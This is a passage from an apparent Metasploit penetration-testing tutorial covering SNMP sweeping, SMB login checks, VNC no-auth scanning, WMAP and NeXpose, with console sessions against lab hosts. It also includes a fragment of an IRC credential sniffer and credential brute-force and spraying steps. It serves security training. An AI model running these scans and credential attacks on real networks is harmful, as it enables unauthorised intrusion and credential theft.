 if (s[:user] and s[:pass]) # When we have the name and the pass sniffed, print it
 print "-> IRC login sniffed: #{s[:session]} >> username:#{s[:user]} password:#{s[:pass]}n"
 end
 sessions.delete(s[:session]) # Remove this session because we dont need to track it anymore
 when nil
 # No matches, don't do anything else # Just in case anything else is matching...
 sessions[s[:session]].merge!({k => matches}) # Just add it to the session object
 end

SNMP Sweeping
==============

SNMP Auxiliary Module for Metasploit
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Continuing with our information gathering, let’s take a look at SNMP Sweeping. SNMP sweeps are often good at finding a ton of information about a specific system or actually compromising the remote device. If you can find a Cisco device running a private string for example, you can actually download the entire device configuration, modify it, and upload your own malicious config. Often the passwords themselves are level 7 encoded, which means they are trivial to decode and obtain the enable or login password for the specific device.

Metasploit comes with a built in auxiliary module specifically for sweeping SNMP devices. There are a couple of things to understand before we perform our SNMP scan. First, ‘read only‘ and ‘read write‘ community strings play an important role in what type of information can be extracted or modified on the devices themselves. If you can “guess” the read-only or read-write strings, you can obtain quite a bit of access you would not normally have. In addition, if Windows-based devices are configured with SNMP, often times with the RO/RW community strings, you can extract patch levels, services running, last reboot times, usernames on the system, routes, and various other amounts of information that are valuable to an attacker.

Note: By default Metasploitable’s SNMP service only listens on localhost. Many of the examples demonstrated here will require you to change these default settings. Open and edit “/etc/default/snmpd“, and change the following from:

::

  SNMPDOPTS='-Lsd -Lf /dev/null -u snmp -I -smux -p /var/run/snmpd.pid 127.0.0.1'

to

::

  SNMPDOPTS='-Lsd -Lf /dev/null -u snmp -I -smux -p /var/run/snmpd.pid 0.0.0.0'

A service restart will be needed in order for the changes to take effect. Once restarted, you will now be able to scan the service from your attacking machine.

What is a MIB?
^^^^^^^^^^^^^^

When querying through SNMP, there is what is called an MIB API. The MIB stands for the Management Information Base. This interface allows you to query the device and extract information. Metasploit comes loaded with a list of default MIBs that it has in its database, it uses them to query the device for more information depending on what level of access is obtained. Let’s take a peek at the auxiliary module.

::

  msf >  search snmp

 Matching Modules
 ================

   Name                                               Disclosure Date  Rank    Description
   ----                                               ---------------  ----    -----------
   auxiliary/scanner/misc/oki_scanner                                  normal  OKI Printer Default Login Credential Scanner
   auxiliary/scanner/snmp/aix_version                                  normal  AIX SNMP Scanner Auxiliary Module
   auxiliary/scanner/snmp/cisco_config_tftp                            normal  Cisco IOS SNMP Configuration Grabber (TFTP)
   auxiliary/scanner/snmp/cisco_upload_file                            normal  Cisco IOS SNMP File Upload (TFTP)
   auxiliary/scanner/snmp/snmp_enum                                    normal  SNMP Enumeration Module
   auxiliary/scanner/snmp/snmp_enumshares                              normal  SNMP Windows SMB Share Enumeration
   auxiliary/scanner/snmp/snmp_enumusers                               normal  SNMP Windows Username Enumeration
   auxiliary/scanner/snmp/snmp_login                                   normal  SNMP Community Scanner
   auxiliary/scanner/snmp/snmp_set                                     normal  SNMP Set Module
   auxiliary/scanner/snmp/xerox_workcentre_enumusers                   normal  Xerox WorkCentre User Enumeration (SNMP)
   exploit/windows/ftp/oracle9i_xdb_ftp_unlock        2003-08-18       great   Oracle 9i XDB FTP UNLOCK Overflow (win32)
   exploit/windows/http/hp_nnm_ovwebsnmpsrv_main      2010-06-16       great   HP OpenView Network Node Manager ovwebsnmpsrv.exe main Buffer Overflow
   exploit/windows/http/hp_nnm_ovwebsnmpsrv_ovutil    2010-06-16       great   HP OpenView Network Node Manager ovwebsnmpsrv.exe ovutil Buffer Overflow
   exploit/windows/http/hp_nnm_ovwebsnmpsrv_uro       2010-06-08       great   HP OpenView Network Node Manager ovwebsnmpsrv.exe Unrecognized Option Buffer Overflow
   exploit/windows/http/hp_nnm_snmp                   2009-12-09       great   HP OpenView Network Node Manager Snmp.exe CGI Buffer Overflow
   exploit/windows/http/hp_nnm_snmpviewer_actapp      2010-05-11       great   HP OpenView Network Node Manager snmpviewer.exe Buffer Overflow
   post/windows/gather/enum_snmp                                       normal  Windows Gather SNMP Settings Enumeration (Registry)

 msf >  use auxiliary/scanner/snmp/snmp_login
 msf auxiliary(snmp_login) >  show options

 Module options (auxiliary/scanner/snmp/snmp_login):

   Name              Current Setting                     Required  Description
   ----              ---------------                     --------  -----------
   BLANK_PASSWORDS   false                               no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                   yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                               no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                               no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                               no        Add all users in the current database to the list
   PASSWORD                                              no        The password to test
   PASS_FILE         /usr/share/wordlists/fasttrack.txt  no        File containing communities, one per line
   RHOSTS                                                yes       The target address range or CIDR identifier
   RPORT             161                                 yes       The target port
   STOP_ON_SUCCESS   false                               yes       Stop guessing when a credential works for a host
   THREADS           1                                   yes       The number of concurrent threads
   USER_AS_PASS      false                               no        Try the username as the password for all users
   VERBOSE           true                                yes       Whether to print output for all attempts
   VERSION           1                                   yes       The SNMP version to scan (Accepted: 1, 2c, all)

 msf auxiliary(snmp_login) >  set RHOSTS 192.168.0.0-192.168.5.255
 rhosts => 192.168.0.0-192.168.5.255
 msf auxiliary(snmp_login) >  set THREADS 10
 threads => 10
 msf auxiliary(snmp_login) >  run
 [*] >> progress (192.168.0.0-192.168.0.255) 0/30208...
 [*] >> progress (192.168.1.0-192.168.1.255) 0/30208...
 [*] >> progress (192.168.2.0-192.168.2.255) 0/30208...
 [*] >> progress (192.168.3.0-192.168.3.255) 0/30208...
 [*] >> progress (192.168.4.0-192.168.4.255) 0/30208...
 [*] >> progress (-) 0/0...
 [*] 192.168.1.50 'public' 'APC Web/SNMP Management Card (MB:v3.8.6 PF:v3.5.5 PN:apc_hw02_aos_355.bin AF1:v3.5.5 AN1:apc_hw02_sumx_355.bin MN:AP9619 HR:A10 SN: NA0827001465 MD:07/01/2008) (Embedded PowerNet SNMP Agent SW v2.2 compatible)'
 [*] Auxiliary module execution completed

As we can see here, we were able to find a community string of ‘public‘. This is most likely read-only and doesn’t reveal a ton of information. We do learn that the device is an APC Web/SNMP device, and what versions it’s running.

SNMP Enum
^^^^^^^^

We can gather lots of information when using SNMP scanning modules such as open ports, services, hostname, processes, and uptime to name a few. Using our Metasploitable virtual machine as our target, we’ll run the auxiliary/scanner/snmp/snmp_enum module and see what information it will provide us. First we load the module and set the RHOST option using the information stored in our workspace. Using hosts -R will set this options for us.

::

  msf  auxiliary(snmp_enum) > run

 [+] 172.16.194.172, Connected.

 [*] System information:

 Host IP                       : 172.16.194.172
 Hostname                      : metasploitable
 Description                   : Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
 Contact                       : msfdev@metasploit.com
 Location                      : Metasploit Lab
 Uptime snmp                   : 02:35:38.71
 Uptime system                 : 00:20:13.21
 System date                   : 2012-7-9 18:11:11.0

 [*] Network information:

 IP forwarding enabled         : no
 Default TTL                   : 64
 TCP segments received         : 19
 TCP segments sent             : 21
 TCP segments retrans          : 0
 Input datagrams               : 5055
 Delivered datagrams           : 5050
 Output datagrams              : 4527

 ...snip...

 [*] Device information:

 Id                  Type                Status              Descr
 768                 Processor           unknown             GenuineIntel: Intel(R) Core(TM) i7-2860QM CPU @ 2.50GHz
 1025                Network             unknown             network interface lo
 1026                Network             unknown             network interface eth0
 1552                Disk Storage        unknown             SCSI disk (/dev/sda)
 3072                Coprocessor         unknown             Guessing that there's a floating point co-processor

 [*] Processes:

 Id                  Status              Name                Path                Parameters
 1                   runnable            init                /sbin/init
 2                   runnable            kthreadd            kthreadd
 3                   runnable            migration/0         migration/0
 4                   runnable            ksoftirqd/0         ksoftirqd/0
 5                   runnable            watchdog/0          watchdog/0
 6                   runnable            events/0            events/0
 7                   runnable            khelper             khelper
 41                  runnable            kblockd/0           kblockd/0
 68                  runnable            kseriod             kseriod

 ...snip...

 5696                runnable            su                  su
 5697                runnable            bash                bash
 5747                running             snmpd               snmpd


 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed

Reviewing our SNMP Scan
^^^^^^^^^^^^^^^^^^^^^^

The output provided above by our SNMP scan provides us with a wealth of information on our target system. Although cropped for length, we can still see lots of relevant information about our target such as its processor type, process IDs, etc.



Writing Your Own Security Scanner
=================================

Using your own Metasploit Auxiliary Module
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

There are times where you may need a specific network security scanner, or having scan activity conducted within Metasploit would be easier for scripting purposes than using an external program. Metasploit has a lot of features that can come in handy for this purpose, like access to all of the exploit classes and methods, built in support for proxies, SSL, reporting, and built in threading. Think of instances where you may need to find every instance of a password on a system, or scan for a custom service. Not to mention, it is fairly quick and easy to write up your own custom scanner.

Some of the many Metasploit scanner features are:

* It provides access to all exploit classes and methods
* Support is provided for proxies, SSL, and reporting
* Built-in threading and range scanning
* Easy to write and run quickly

Writing your own scanner module can also be extremely useful during security audits by allowing you to locate every instance of a bad password or you can scan in-house for a vulnerable service that needs to be patched. Using the Metasploit Framework will allow you to store this information in the database for organization and later reporting needs.

We will use this very simple TCP scanner that will connect to a host on a default port of 12345 which can be changed via the scanner module options at run time. Upon connecting to the server, it sends ‘HELLO SERVER’, receives the response and prints it out along with the IP address of the remote host.

::

  require 'msf/core'
 class Metasploit3 < Msf::Auxiliary include Msf::Exploit::Remote::Tcp include Msf::Auxiliary::Scanner def initialize super( 'Name' => 'My custom TCP scan',
                        'Version'        => '$Revision: 1 $',
                        'Description'    => 'My quick scanner',
                        'Author'         => 'Your name here',
                        'License'        => MSF_LICENSE
                )
                register_options(
                        [
                                Opt::RPORT(12345)
                        ], self.class)
        end

        def run_host(ip)
                connect()
		greeting = "HELLO SERVER"
		sock.puts(greeting)
                data = sock.recv(1024)
                print_status("Received: #{data} from #{ip}")
                disconnect()
        end
 end


Saving and Testing our Auxiliary Module
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

We save the file into our ./modules/auxiliary/scanner/ directory as simple_tcp.rb and load up msfconsole. It’s important to note two things here. First, modules are loaded at run time, so our new module will not show up unless we restart our interface of choice. The second being that the folder structure is very important, if we would have saved our scanner under ./modules/auxiliary/scanner/http/ it would show up in the modules list as scanner/http/simple_tcp.

To test our security scanner, set up a netcat listener on port 12345 and pipe in a text file to act as the server response.

::

  root@kali:~# nc -lnvp 12345 < response.txt
 listening on [any] 12345 ...

Next, you select your new scanner module, set its parameters, and run it to see the results.

::

  msf > use scanner/simple_tcp
 msf auxiliary(simple_tcp) > set RHOSTS 192.168.1.100
 RHOSTS => 192.168.1.100
 msf auxiliary(simple_tcp) > run

 [*] Received: hello metasploit from 192.168.1.100
 [*] Auxiliary module execution completed

As you can tell from this simple example, this level of versatility can be of great help when you need some custom code in the middle of a penetration test. The power of the framework and reusable code really shines through here.

Reporting Results from our Security Scanner
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

The report mixin provides report_*(). These methods depend on a database in order to operate:

* Check for a live database connection
* Check for a duplicate record
* Write a record into the table

The database drivers are now autoloaded.

::

  db_driver postgres (or sqlite3, mysql)


Use the Auxiliary::Report mixin in your scanner code.

::

  include Msf::Auxiliary::Report


Then, call the report_note() method.

::

  report_note(
 :host => rhost,
 :type => "myscanner_password",
 :data => data
 )

Learning to write your own network security scanners may seem like a daunting task, but as we’ve just shown, the benefits of creating our own auxiliary module to house and run our security scanner will help us in storing and organizing our data, not to mention help with our report writing during our pentests.


Windows Patch Enumeration
=========================

Enumerating Installed Windows Patches
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

When confronted with  a Windows target, identifying which patches have been applied is an easy way of knowing if regular updates happen. It may also provide information on other possible vulnerabilities present on the system.

An auxiliary module was specifically created for just this task called “enum_patches“. Like any post exploitation module, it is loaded using the “use” command.

::

  msf exploit(handler) > use post/windows/gather/enum_patches
 msf post(enum_patches) > show options

 Module options (post/windows/gather/enum_patches):

   Name       Current Setting       Required  Description
   ----       ---------------       --------  -----------
   KB         KB2871997, KB2928120  yes       A comma separated list of KB patches to search for
   MSFLOCALS  true                  yes       Search for missing patchs for which there is a MSF local module
   SESSION                          yes       The session to run this module on.


This module also has a few advanced options, which can be displayed by using the “show advanced” command.

::

  msf post(enum_patches) > show advanced

 Module advanced options (post/windows/gather/enum_patches):

   Name           : VERBOSE
   Current Setting: true
   Description    : Enable detailed status messages

   Name           : WORKSPACE
   Current Setting:
   Description    : Specify the workspace for this module


Once a meterpreter session as been initiated with your Windows target, load up the enum_patches module setting the SESSION option. Once done using the “run” command will launch the module against our target.

::

  msf post(enum_patches) > show options

 Module options (post/windows/gather/enum_patches):

   Name       Current Setting       Required  Description
   ----       ---------------       --------  -----------
   KB         KB2871997, KB2928120  yes       A comma separated list of KB patches to search for
   MSFLOCALS  true                  yes       Search for missing patchs for which there is a MSF local module
   SESSION    1                     yes       The session to run this module on.

 msf post(enum_patches) > run

 [*] KB2871997 applied
 [+] KB2928120 is missing
 [+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)
 [*] KB2305420 applied
 [+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2
 [+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity
 [+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1
 [+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1
 [*] Post module execution completed


**********************
Vulnerability Scanning
**********************

Vulnerability scanning will allow you to quickly scan a target IP range looking for known vulnerabilities, giving a penetration tester a quick idea of what attacks might be worth conducting.

When used properly, this is a great asset to a pen tester, yet it is not without it’s draw backs. Vulnerability scanning is well known for a high false positive and false negative rate. This has to be kept in mind when working with any vulnerability scanning software.

Lets look through some of the vulnerability scanning capabilities that the Metasploit Framework can provide.

SMB Login Check
================

Scanning for Access with smb_login
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

A common situation to find yourself in is being in possession of a valid username and password combination, and wondering where else you can use it. This is where the SMB Login Check Scanner can be very useful, as it will connect to a range of hosts and determine if the username/password combination can access the target.

Keep in mind that this is very “loud” as it will show up as a failed login attempt in the event logs of every Windows box it touches. Be thoughtful on the network you are taking this action on. Any successful results can be plugged into the windows/smb/psexec exploit module (exactly like the standalone tool), which can be used to create Meterpreter Sessions.

::

  msf > use auxiliary/scanner/smb/smb_login
 msf auxiliary(smb_login) > show options

 Module options (auxiliary/scanner/smb/smb_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   ABORT_ON_LOCKOUT  false            yes       Abort the run when an account lockout is detected
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   DETECT_ANY_AUTH   true             no        Enable detection of systems accepting any authentication
   PASS_FILE                          no        File containing passwords, one per line
   PRESERVE_DOMAINS  true             no        Respect a username that contains a domain name.
   Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
   RECORD_GUEST      false            no        Record guest-privileged random logins to the database
   RHOSTS                             yes       The target address range or CIDR identifier
   RPORT             445              yes       The SMB service port (TCP)
   SMBDomain         .                no        The Windows domain to use for authentication
   SMBPass                            no        The password for the specified username
   SMBUser                            no        The username to authenticate as
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           true             yes       Whether to print output for all attempts

 msf auxiliary(smb_login) > set RHOSTS 192.168.1.0/24
 RHOSTS => 192.168.1.0/24
 msf auxiliary(smb_login) > set SMBUser victim
 SMBUser => victim
 msf auxiliary(smb_login) > set SMBPass s3cr3t
 SMBPass => s3cr3t
 msf auxiliary(smb_login) > set THREADS 50
 THREADS => 50
 msf auxiliary(smb_login) > run

 [*] 192.168.1.100 - FAILED 0xc000006d - STATUS_LOGON_FAILURE
 [*] 192.168.1.111 - FAILED 0xc000006d - STATUS_LOGON_FAILURE
 [*] 192.168.1.114 - FAILED 0xc000006d - STATUS_LOGON_FAILURE
 [*] 192.168.1.125 - FAILED 0xc000006d - STATUS_LOGON_FAILURE
 [*] 192.168.1.116 - SUCCESSFUL LOGIN (Unix)
 [*] Auxiliary module execution completed

 msf auxiliary(smb_login) >


VNC Authentication
=================

VNC Authentication Check with the None Scanner
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

The VNC Authentication None Scanner is an Auxiliary Module for Metasploit. This tool will search a range of IP addresses looking for targets that are running a VNC Server without a password configured. Pretty well every administrator worth his/her salt sets a password prior to allowing inbound connections but you never know when you might catch a lucky break and a successful pen-test leaves no stone unturned.

In fact, once when doing a pentest, we came across a system on the target network with an open VNC installation. While we were documenting our findings, I noticed some activity on the system. It turns out, someone else had found the system as well! An unauthorized user was live and active on the same system at the same time. After engaging in some social engineering with the intruder, we were informed by the user they had just got into the system, and came across it as they were scanning large chunks of IP addresses looking for open systems. This just drives home the fact that intruders are in fact actively looking for this low hanging fruit, so you ignore it at your own risk.

To utilize the VNC Scanner, we first select the auxiliary module, define our options, then let it run.

::

  msf auxiliary(vnc_none_auth) > use auxiliary/scanner/vnc/vnc_none_auth
 msf auxiliary(vnc_none_auth) > show options

 Module options:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target address range or CIDR identifier
   RPORT    5900             yes       The target port
   THREADS  1                yes       The number of concurrent threads

 msf auxiliary(vnc_none_auth) > set RHOSTS 192.168.1.0/24
 RHOSTS => 192.168.1.0/24
 msf auxiliary(vnc_none_auth) > set THREADS 50
 THREADS => 50
 msf auxiliary(vnc_none_auth) > run

 [*] 192.168.1.121:5900, VNC server protocol version : RFB 003.008
 [*] 192.168.1.121:5900, VNC server security types supported : None, free access!
 [*] Auxiliary module execution completed


WMAP Web Scanner
================

WMAP is a feature-rich web application vulnerability scanner that was originally created from a tool named SQLMap. This tool is integrated with Metasploit and allows us to conduct web application scanning from within the Metasploit Framework.

We begin by first creating a new database to store our WMAP scan results in, load the “wmap” plugin, and run “help” to see what new commands are available to us.

::

  msf > load wmap

 .-.-.-..-.-.-..---..---.
 | | | || | | || | || |-'
 `-----'`-'-'-'`-^-'`-'
 [WMAP 1.5.1] ===  et [  ] metasploit.com 2012
 [*] Successfully loaded plugin: wmap

 msf >  help

 wmap Commands
 =============

    Command       Description
    -------       -----------
    wmap_modules  Manage wmap modules
    wmap_nodes    Manage nodes
    wmap_run      Test targets
    wmap_sites    Manage sites
    wmap_targets  Manage targets
    wmap_vulns    Display web vulns

 ...snip...


Prior to running a web app scan, we first need to add a new target URL by passing the “-a” switch to “wmap_sites”. Afterwards, running “wmap_sites -l” will print out the available targets.

::

  msf > wmap_sites -h
 [*]  Usage: wmap_targets [options]
 	-h        Display this help text
 	-a [url]  Add site (vhost,url)
 	-l        List all available sites
 	-s [id]   Display site structure (vhost,url|ids) (level)


 msf > wmap_sites -a http://172.16.194.172
 [*] Site created.
 msf > wmap_sites -l
 [*] Available sites
 ===============

     Id  Host            Vhost           Port  Proto  # Pages  # Forms
     --  ----            -----           ----  -----  -------  -------
     0   172.16.194.172  172.16.194.172  80    http   0        0

Next, we add the site as a target with “wmap_targets”.

::

  msf > wmap_targets -h
 [*] Usage: wmap_targets [options]
	-h 		Display this help text
	-t [urls]	Define target sites (vhost1,url[space]vhost2,url)
	-d [ids]	Define target sites (id1, id2, id3 ...)
	-c 		Clean target sites list
	-l  		List all target sites


 msf > wmap_targets -t http://172.16.194.172/mutillidae/index.php


Once added, we can view our list of targets by using the ‘-l’ switch from the console.

::

  msf > wmap_targets -l
 [*] Defined targets
 ===============

     Id  Vhost           Host            Port  SSL    Path
     --  -----           ----            ----  ---    ----
     0   172.16.194.172  172.16.194.172  80    false	/mutillidae/index.php

Using the “wmap_run” command will scan the target system.

::

  msf > wmap_run -h
 [*] Usage: wmap_run [options]
	-h                        Display this help text
	-t                        Show all enabled modules
	-m [regex]                Launch only modules that name match provided regex.
	-p [regex]                Only test path defined by regex.
	-e [/path/to/profile]     Launch profile modules against all matched targets.
	                          (No profile file runs all enabled modules.)

We first use the “-t” switch to list the modules that will be used to scan the remote system.


::

  msf > wmap_run -t

 [*] Testing target:
 [*] 	Site: 192.168.1.100 (192.168.1.100)
 [*] 	Port: 80 SSL: false
 [*] ============================================================
 [*] Testing started. 2012-01-16 15:46:42 -0500
 [*]
 =[ SSL testing ]=
 [*] ============================================================
 [*] Target is not SSL. SSL modules disabled.
 [*]
 =[ Web Server testing ]=
 [*] ============================================================
 [*] Loaded auxiliary/admin/http/contentkeeper_fileaccess ...
 [*] Loaded auxiliary/admin/http/tomcat_administration ...
 [*] Loaded auxiliary/admin/http/tomcat_utf8_traversal ...
 [*] Loaded auxiliary/admin/http/trendmicro_dlp_traversal ...
 ..snip...

 msf >


All that remains now is to actually run the WMAP scan against our target URL.

::

  msf > wmap_run -e
 [*] Using ALL wmap enabled modules.
 [-] NO WMAP NODES DEFINED. Executing local modules
 [*] Testing target:
 [*] 	Site: 172.16.194.172 (172.16.194.172)
 [*] 	Port: 80 SSL: false
 ============================================================
 [*] Testing started. 2012-06-27 09:29:13 -0400
 [*]
 =[ SSL testing ]=
 ============================================================
 [*] Target is not SSL. SSL modules disabled.
 [*]
 =[ Web Server testing ]=
 ============================================================
 [*] Module auxiliary/scanner/http/http_version

 [*] 172.16.194.172:80 Apache/2.2.8 (Ubuntu) DAV/2 ( Powered by PHP/5.2.4-2ubuntu5.10 )
 [*] Module auxiliary/scanner/http/open_proxy
 [*] Module auxiliary/scanner/http/robots_txt


 ..snip...
 ..snip...
 ..snip...


 [*] Module auxiliary/scanner/http/soap_xml
 [*] Path: /
 [*] Server 172.16.194.172:80 returned HTTP 404 for /.  Use a different one.
 [*] Module auxiliary/scanner/http/trace_axd
 [*] Path: /
 [*] Module auxiliary/scanner/http/verb_auth_bypass
 [*]
 =[ Unique Query testing ]=
 ============================================================
 [*] Module auxiliary/scanner/http/blind_sql_query
 [*] Module auxiliary/scanner/http/error_sql_injection
 [*] Module auxiliary/scanner/http/http_traversal
 [*] Module auxiliary/scanner/http/rails_mass_assignment
 [*] Module exploit/multi/http/lcms_php_exec
 [*]
 =[ Query testing ]=
 ============================================================
 [*]
 =[ General testing ]=
 ============================================================
 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 Launch completed in 212.01512002944946 seconds.
 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 [*] Done.


Once the scan has finished executing, we take a look at the database to see if WMAP found anything of interest.


::

  msf > wmap_vulns -l
 [*] + [172.16.194.172] (172.16.194.172): scraper /
 [*] 	scraper Scraper
 [*] 	GET Metasploitable2 - Linux
 [*] + [172.16.194.172] (172.16.194.172): directory /dav/
 [*] 	directory Directory found.
 [*] 	GET Res code: 200
 [*] + [172.16.194.172] (172.16.194.172): directory /cgi-bin/
 [*] 	directory Directoy found.
 [*] 	GET Res code: 403

 ...snip...

 msf >

Looking at the above output, we can see that WMAP has reported one vulnerability. Running “vulns” will list the details for us.


::

  msf > vulns
 [*] Time: 2012-01-16 20:58:49 UTC Vuln: host=172.16.2.207 port=80 proto=tcp name=auxiliary/scanner/http/options refs=CVE-2005-3398,CVE-2005-3498,OSVDB-877,BID-11604,BID-9506,BID-9561

 msf >


Because of our vulnerability scanning with WMAP, we can now use these results to gather further information on the reported vulnerability. As pentesters, we would want to investigate each finding further and identify if there are potential methods for attack.


Working with NeXpose
==================

We create a new report in NeXpose and save the scan results in ‘NeXpose Simple XML‘ format that we can later import into Metasploit. Next, we fire up msfconsole, create a new workspace, and use the ‘db_import‘ command to auto-detect and import our scan results file.

::

  msf > db_import /root/Nexpose/report.xml
 [*] Importing 'NeXpose Simple XML' data
 [*] Importing host 172.16.194.172
 [*] Successfully imported /root/Nexpose/report.xml


::

  msf > services

 Services
 ========

 host            port   proto  name               state  info
 ----            ----   -----  ----               -----  ----
 172.16.194.172  21     tcp    ftp                open   vsFTPd 2.3.4
 172.16.194.172  22     tcp    ssh                open   OpenSSH 4.7p1
 172.16.194.172  23     tcp    telnet             open
 172.16.194.172  25     tcp    smtp               open   Postfix
 172.16.194.172  53     tcp    dns-tcp            open   BIND 9.4.2
 172.16.194.172  53     udp    dns                open   BIND 9.4.2
 172.16.194.172  80     tcp    http               open   Apache 2.2.8
 172.16.194.172  111    tcp    portmapper         open
 172.16.194.172  111    udp    portmapper         open
 172.16.194.172  137    udp    cifs name service  open
 172.16.194.172  139    tcp    cifs               open   Samba 3.0.20-Debian
 172.16.194.172  445    tcp    cifs               open   Samba 3.0.20-Debian
 172.16.194.172  512    tcp    remote execution   open
 172.16.194.172  513    tcp    remote login       open
 172.16.194.172  514    tcp    remote shell       open
 172.16.194.172  1524   tcp    ingreslock         open
 172.16.194.172  2049   tcp    nfs                open
 172.16.194.172  2049   udp    nfs                open
 172.16.194.172  3306   tcp    mysql              open   MySQL 5.0.51a
 172.16.194.172  5432   tcp    postgres           open
 172.16.194.172  5900   tcp    vnc                open
 172.16.194.172  6000   tcp    xwindows           open
 172.16.194.172  8180   tcp    http               open   Apache Tomcat
 172.16.194.172  41407  udp    status             open
 172.16.194.172  44841  tcp    mountd             open
 172.16.194.172  47207  tcp    nfs lockd          open
 172.16.194.172  48972  udp    nfs lockd          open
 172.16.194.172  51255  tcp    status             open
 172.16.194.172  58769  udp    mountd             open


We now have NeXpose’s report at our disposal directly from the msfconsole. As discussed in a previous modules, using the database backend commands, we can search this information using a few simple key strokes.

One that was not covered however was the ‘vulns‘ command. We can issue this command and see what vulnerabilities were found by our NeXpose scan. With no options given ‘vulns‘ will simply display every vulnerability found such as service names, associated ports, CVEs (if any) etc.

::

  msf > vulns
 [*] Time: 2012-06-20 02:09:50 UTC Vuln: host=172.16.194.172 name=NEXPOSE-vnc-password-password refs=NEXPOSE-vnc-password-password
 [*] Time: 2012-06-20 02:09:50 UTC Vuln: host=172.16.194.172 name=NEXPOSE-backdoor-vnc-0001 refs=NEXPOSE-backdoor-vnc-0001
 [*] Time: 2012-06-20 02:09:49 UTC Vuln: host=172.16.194.172 name=NEXPOSE-cifs-nt-0001 refs=CVE-1999-0519,URL-http://www.hsc.fr/ressources/presentations/null_sessions/,NEXPOSE-cifs-nt-0001

 ...snip...

 [*] Time: 2012-06-20 02:09:52 UTC Vuln: host=172.16.194.172 name=NEXPOSE-openssl-debian-weak-keys refs=CVE-2008-0166,BID-29179,SECUNIA-30136,SECUNIA-30220,SECUNIA-30221,SECUNIA-30231,SECUNIA-30239,SECUNIA-30249,URL-http://metasploit.com/users/hdm/tools/debian-openssl/,URL-http://wiki.debian.org/SSLkeys,URL-http://www.debian.org/security/2008/dsa-1571,URL-http://www.debian.org/security/2008/dsa-1576,URL-http://www.debian.org/security/key-rollover/,URL-http://www.ubuntu.com/usn/usn-612-1,URL-http://www.ubuntu.com/usn/usn-612-2,URL-http://www.ubuntu.com/usn/usn-612-3,URL-http://www.ubuntu.com/usn/usn-612-4,URL-http://www.ubuntu.com/usn/usn-612-5,URL-http://www.ubuntu.com/usn/usn-612-6,URL-http://www.ubuntu.com/usn/usn-612-7,URL-http://www.ubuntu.com/usn/usn-612-8,NEXPOSE-openssl-debian-weak-keys
 [*] Time: 2012-06-20 02:09:52 UTC Vuln: host=172.16.194.172 name=NEXPOSE-ssh-openssh-x11uselocalhost-x11-forwarding-session-hijack refs=CVE-2008-3259,BID-30339,SECUNIA-31179,NEXPOSE-ssh-openssh-x11uselocalhost-x11-forwarding-session-hijack


Much like the ‘hosts‘ & ‘services‘ commands, we have a few options available to produce a more specific output when searching vulnerabilities stored in our imported report. Let’s take a look at those.

::

  msf > vulns -h
 Print all vulnerabilities in the database

 Usage: vulns [addr range]

  -h,--help             Show this help information
  -p,--port >portspec>  List vulns matching this port spec
  -s >svc names>        List vulns matching these service names
  -S,--search           Search string to filter by
  -i,--info             Display Vuln Info

 Examples:
  vulns -p 1-65536          # only vulns with associated services
  vulns -p 1-65536 -s http  # identified as http on any port


Lets target a specific service we know to be running on Metasploitable and see what information was collected by our vulnerability scan. We’ll display vulnerabilities found for the ‘mysql‘ service. Using the following options: ‘-p‘ to specify the port number, ‘-s‘ service name and finally ‘-i‘ the vulnerability information.


::

  msf > vulns -p 3306 -s mysql -i
 [*] Time: 2012-06-20 02:09:51 UTC Vuln: host=172.16.194.172 name=NEXPOSE-mysql-dispatch_command-multiple-format-string refs=CVE-2009-2446,BID-35609,OSVDB-55734,SECUNIA-35767,SECUNIA-38517,NEXPOSE-mysql-dispatch_command-multiple-format-string info=mysql-dispatch_command-multiple-format-string
 [*] Time: 2012-06-20 02:09:51 UTC Vuln: host=172.16.194.172 name=NEXPOSE-mysql-bug-32707-send-error-bof refs=URL-http://bugs.mysql.com/bug.php?id=32707,NEXPOSE-mysql-bug-32707-send-error-bof info=mysql-bug-32707-send-error-bof
 [*] Time: 2012-06-20 02:09:51 UTC Vuln: host=172.16.194.172 name=NEXPOSE-mysql-bug-37428-user-defind-function-remote-codex refs=URL-http://bugs.mysql.com/bug.php?id=37428,NEXPOSE-mysql-bug-37428-user-defind-function-remote-codex info=mysql-bug-37428-user-defind-function-remote-codex
